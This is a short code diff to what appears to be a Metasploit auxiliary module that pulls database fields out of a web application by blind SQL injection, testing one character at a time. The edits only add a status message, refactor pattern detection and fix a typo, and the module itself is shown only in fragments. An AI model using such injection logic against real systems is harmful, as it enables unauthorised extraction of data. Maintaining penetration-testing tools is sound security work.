@@ -127,6 +127,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def blind_size(field, table, condition, size, charset,  patterns = {})
+    vprint_status("Retrieving field '#{field}' string (#{size} bytes) ...")
     str = ""
     for position in 0..size
       for char in charset.split('')
@@ -178,16 +179,13 @@ class MetasploitModule < Msf::Auxiliary
     end
     pattern1 = defined?(news[0]) ? news[0].search('span[@itemprop="headline"]').text : ''
     pattern2 = defined?(news[1]) ? news[1].search('span[@itemprop="headline"]').text : ''
-    if pattern1 != '' and pattern2 != ''
-      print_status("Pattern1: #{pattern1}")
-      print_status("Pattern2: #{pattern2}")
-    else
-      print_status("Couldn't determine Pattern1 and Pattern2 automatically, switching to user speficied values...")
+    if pattern1.to_s.eql?('') || pattern2.to_s.eql?('')
+      print_status("Couldn't determine Pattern1 and Pattern2 automatically, switching to user specified values...")
       pattern1 = datastore['PATTERN1']
       pattern2 = datastore['PATTERN2']
-      print_status("Pattern1: #{pattern1}")
-      print_status("Pattern2: #{pattern2}")
     end
+    print_status("Pattern #1: #{pattern1}")
+    print_status("Pattern #2: #{pattern2}")
     return pattern1, pattern2
   end
 
